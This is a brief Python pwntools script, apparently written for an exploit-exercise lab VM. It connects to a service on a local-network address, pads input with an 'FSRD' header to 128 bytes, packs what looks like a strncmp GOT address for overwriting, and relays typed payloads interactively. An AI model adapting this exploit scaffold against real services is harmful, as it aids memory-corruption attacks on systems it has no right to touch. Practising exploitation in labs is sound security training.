from pwn import *
def pad(s):
	s=''.join(["FSRD",s])
	return s.ljust(128,'\x00')
io = remote('192.168.56.101',2993)
strncmp = pack(0x804d494)
#io.sendline(pad(""+strncmp))
while True:
	msg = raw_input("> ")
	if msg:
		io.sendline(pad(msg))
	else:
		break
io.interactive()

